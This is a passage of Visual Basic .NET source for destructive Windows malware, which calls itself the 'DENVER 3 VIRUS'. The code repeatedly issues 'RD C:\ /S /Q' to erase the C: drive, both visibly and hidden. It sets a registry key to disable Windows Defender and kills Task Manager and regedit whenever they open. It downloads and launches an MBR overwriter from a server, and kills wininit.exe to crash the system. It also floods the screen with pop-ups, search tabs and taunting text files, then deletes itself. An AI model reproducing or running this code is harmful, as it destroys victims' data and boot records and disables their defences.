            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
            a5.Show()

            a6.Show()
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Catch ex As Exception

        End Try
        Wait(10)

        a7.Show()
        a8.Show()
        Wait(1)
        Try
            Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Catch ex As Exception

        End Try

        Wait(10)
        a9.Show()
        a10.Show()
        a11.Show()
        Wait(20)
        ' Display the names of the files.
        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        Wait(10)
        Try
            Process.Start("https://www.google.com/search?q=for+the+lulz&sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-3ZuC1psWsqK-aMP1WjOfTiXwLBQ%3A1713312563052&ei=MxMfZqjjAsu0ptQPkpW8mAY&ved=0ahUKEwjoyNbV-seFAxVLmokEHZIKD2MQ4dUDCBA&uact=5&oq=for+the+lulz&gs_lp=Egxnd3Mtd2l6LXNlcnAiDGZvciB0aGUgbHVsejIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyCxAAGIAEGIoFGIYDSM8IUOMFWN8GcAF4AZABAJgBZqABvwGqAQMxLjG4AQPIAQD4AQGYAgOgAscBwgIKEAAYRxjWBBiwA8ICCBAAGIAEGKIEmAMAiAYBkAYIkgcDMi4xoAffBQ&sclient=gws-wiz-serp")
        Catch ex As Exception

        End Try

        Wait(3)
        Try
            Process.Start("https://www.google.com/search?sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-wMlNAtRhrt2T5ryRfPYICQBcEzg:1713312633304&q=windows+is+spyware&uds=AMwkrPte2rONdlHqaOEoNFr7YgHOiVFtgpI_Ouhp_p_393pfzLmTJdzG2eu02e1iRLtixUe8z4CGC2fuy7dcMRHztzSCFzI3dGLWAVQhBLrNqa6I5_RYST8DU1TQbprLSSo4h0E36iZuaMKfEtU8DupyBvGyxFpeJF6xxgOfHPEZ6HNMvV2BsglEgiuadGToqCC4x43gAAyb99N-2Pu0jgHjK1KRnsfHdxg-Pk7pwVebISixHAjviqZAl3hvC5lEiJSLj9l_zUpeHXM8HTSrqj8oX23a0Cx4DgeuBiZ9E2gkooxJZf7yn9PA3cOTe1ZWK231TMjcnghX&udm=2&prmd=ivnsbmtz&sa=X&ved=2ahUKEwjftJb3-seFAxVstokEHWrEDB8QtKgLegQICRAB&biw=1920&bih=919&dpr=1#vhid=nVwcAOfoXtc5YM&vssid=mosaic")
        Catch ex As Exception
        End Try
        Wait(4)
        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc

        Try
            Process.Start("https://www.google.com/search?q=windows+11+is+shit&oq=windows+11+is+shit&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCDQ4NDlqMGo5qAIAsAIA&sourceid=chrome&ie=UTF-8")
        Catch ex As Exception

        End Try

        Wait(5)
        a4.Show()

        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        OpenTextFile("WINDOWS 11 IS ***CRAP**")
        OpenTextFile("ur mom")
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        OpenTextFile("MUSIC: Undertale Last Breath: An Enigmatic Encounter (Phase 3)")
        OpenTextFile("***YOUR PC HAS BEEN FUCKED BY THE DENVER 3 VIRUS LMAO***")
        OpenTextFile("BSOD INCOMEING!!!!!!!!!!!!!")
        Wait(4)
        Wait(10)
        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        Try
            Process.Start("https://www.google.com/search?q=I%27m+about+to+blue+screen+this+man%27s+computer%21%21%21%21%21%21&sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn08FZz1OtO5v_LYabeyEF3EhtJUM7Q%3A1713312932801&ei=pBQfZoTNMP3sptQP3NGDoA4&ved=0ahUKEwiEr_6F_MeFAxV9tokEHdzoAOQQ4dUDCBA&uact=5&oq=I%27m+about+to+blue+screen+this+man%27s+computer%21%21%21%21%21%21&gs_lp=Egxnd3Mtd2l6LXNlcnAiMkknbSBhYm91dCB0byBibHVlIHNjcmVlbiB0aGlzIG1hbidzIGNvbXB1dGVyISEhISEhMggQIRigARjDBDIIECEYoAEYwwQyCBAhGKABGMMEMggQIRigARjDBDIIECEYoAEYwwRIhUVQuwVYrDpwB3gBkAEAmAHKAaAB4A6qAQYxNC40LjG4AQPIAQD4AQGYAhagArMLwgIKEAAYRxjWBBiwA8ICCBAAGIAEGKIEwgIIEAAYiQUYogTCAgoQIRgKGKABGMMEwgIFECEYoAGYAwCIBgGQBgiSBwQxOC40oAejYw&sclient=gws-wiz-serp")
        Catch ex As Exception

        End Try
        For i As Integer = 1 To 70
            Try
                Dim q As New still_using_this_computer()
                q.Show()
            Catch ex As Exception
            End Try
        Next

        Wait(3)
        MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False)
    End Sub
    Public Sub OpenTextFile(Text)
        Try
            Dim random As New Random()
            Dim randomNumber As Integer = random.Next(1, 63463456)
            Dim path As String = InstallPath & "\" & randomNumber & ".TXT\"
            Dim fs As FileStream = File.Create(path)
            Dim info As Byte() = New UTF8Encoding(True).GetBytes(Text)
            fs.Write(info, 0, info.Length)
            fs.Close()
            Process.Start(InstallPath & "\" & randomNumber & ".TXT\")
        Catch ex As Exception

        End Try
    End Sub

    Function CheckIfFileExists(url As String) As Boolean
        Dim request As HttpWebRequest = WebRequest.Create(url)
        request.Method = "HEAD"

        Try
            Using response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
                Return response.StatusCode = HttpStatusCode.OK
            End Using
        Catch ex As WebException
            Return False ' File does not exist or other error occurred
        End Try
    End Function


    Private Sub DisableWindowsDefender()
        Try
            Dim keyPath As String = "SOFTWARE\Microsoft\Windows Defender"
            Dim keyName As String = "DisableAntiSpyware"

            Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(keyPath, True)
                If key IsNot Nothing Then
                    key.SetValue(keyName, 1, RegistryValueKind.DWord)
                End If
            End Using
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Wait(ByVal seconds As Integer)
        For i As Integer = 0 To seconds * 100
            System.Threading.Thread.Sleep(10)
            Application.DoEvents()
        Next
    End Sub
    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If Not Close1 Then
            Dim meg As DialogResult = MessageBox.Show("Warning ending a critical system process may result in your system becoming unstable / unusable do you still want to end the process: “"wininit.exe"”? ", "Windows", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
            If meg = DialogResult.Yes Then
                MyUtilities.RunCommandComInvis("TASKKILL /im wininit.exe /t /f", "", False)
            End If
            e.Cancel = True
        End If

    End Sub

    Private Sub NoReg_Tick(sender As Object, e As EventArgs) Handles NoReg.Tick
        Dim pName As String = "regedit"
        Dim psList() As Process
        Try
            psList = Process.GetProcesses()
            For Each p As Process In psList
                If (pName = p.ProcessName) Then
                    Dim proc = Process.GetProcessesByName("regedit")
                    For i As Integer = 0 To proc.Count - 1
                        proc(i).Kill()
                    Next i
                    No.Show()
                End If
            Next p

        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub NoTask_Tick(sender As Object, e As EventArgs) Handles NoTask.Tick
        Dim pName As String = "Taskmgr"
        Dim psList() As Process
        Try
            psList = Process.GetProcesses()
            For Each p As Process In psList
                If (pName = p.ProcessName) Then
                    Dim proc = Process.GetProcessesByName("Taskmgr")
                    For i As Integer = 0 To proc.Count - 1
                        proc(i).Kill()
                    Next i
                    No.Show()
                End If
            Next p

        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub
    Sub ReplaceExtensions(folderPath As String, oldExtension As String, newExtension As String)
        For Each filePath As String In Directory.GetFiles(folderPath)
            Try
                If Path.GetExtension(filePath).ToLower() = oldExtension.ToLower() Then
                    Dim newFilePath As String = Path.Combine(folderPath, Path.GetFileNameWithoutExtension(filePath) & newExtension)
                    File.Move(filePath, newFilePath)
                End If
            Catch ex As Exception

            End Try
        Next
    End Sub
    Public Sub OverrideMBR() 'fucks your pc
        Try
            My.Computer.Network.DownloadFile(ServerAddr & "MbrOverwriter.exe", InstallPath & "\MbrOverwriter.exe")
        Catch ex As Exception
            Try
                My.Computer.Network.DownloadFile(ServerAddr & "MbrOverwriter.exe", InstallPath & "\MbrOverwriter.exe")
            Catch ex1 As Exception

            End Try
        End Try
        Try
            Process.Start(InstallPath & "\MbrOverwriter.exe")
        Catch ex As Exception
            Try
                Process.Start(InstallPath & "\MbrOverwriter.exe")
            Catch ex1 As Exception
            End Try
        End Try

    End Sub
    Public Shared Function CheckForInternetConnection() As Boolean
        Try
            Using client = New WebClient()
                Using stream = client.OpenRead("http://www.google.com")
                    Return True
                End Using
            End Using
        Catch
            Return False
        End Try
    End Function

    Private Function CheckIfDownloadsWork()
        Try
            Dim random As New Random()
            Dim randomNumber As Integer = random.Next(1, 63463456)
            My.Computer.Network.DownloadFile(ServerAddr & "NAH.CMD", Application.StartupPath & "\" & randomNumber)
            My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\" & randomNumber)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Friend Sub SetWallpaper(ByVal img As Image)

        Dim imageLocation As String

        imageLocation = My.Computer.FileSystem.CombinePath(My.Computer.FileSystem.SpecialDirectories.MyPictures, WallpaperFile)

        Try

            img.Save(imageLocation, System.Drawing.Imaging.ImageFormat.Bmp)

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, imageLocation, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)

        Catch Ex As Exception

            MsgBox("There was an error setting the wallpaper: " & Ex.Message)

        End Try

    End Sub
    Private Sub completely_obliterate_hard_drive_files_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles completely_obliterate_hard_drive_files.DoWork

    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub PIC_DEATH_WALPAPER_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub timer_minimize_window_Tick(sender As Object, e As EventArgs) Handles timer_minimize_window.Tick
        Try
            Me.WindowState = FormWindowState.Minimized
        Catch ex As Exception

        End Try
    End Sub

    Private Sub FitTeaTimer_Tick(sender As Object, e As EventArgs) Handles FitTeaTimer.Tick
        Try
            Process.Start("https://www.fittea.com/")
        Catch ex As Exception

        End Try
    End Sub


    Private Sub Kill(ByVal Timeout As Integer)

        Dim p As New System.Diagnostics.ProcessStartInfo("cmd.exe")
        p.Arguments = "/C ping 1.1.1.1 -n 1 -w " & Timeout.ToString & " > Nul & Del """ & Application.ExecutablePath & """"
        p.CreateNoWindow = True
        p.ErrorDialog = False
        p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
        System.Diagnostics.Process.Start(p)
        Application.ExitThread()
    End Sub


End Class

Public Class MyUtilities
    Shared Sub RunCommandCom(command As String, arguments As String, permanent As Boolean)
        Dim p As Process = New Process()
        Dim pi As ProcessStartInfo = New ProcessStartInfo()
        pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
        pi.FileName = "cmd.exe"
        p.StartInfo = pi
        p.Start()
    End Sub


    Shared Sub RunCommandComInvis(command As String, arguments As String, permanent As Boolean)
        Dim p As Process = New Process()
        Dim pi As ProcessStartInfo = New ProcessStartInfo()
        pi.WindowStyle = ProcessWindowStyle.Hidden
        pi.Arguments = " " + If(permanent = True, "/K", "/C") + " " + command + " " + arguments
        pi.FileName = "cmd.exe"
        p.StartInfo = pi
        p.Start()
    End Sub
End Class
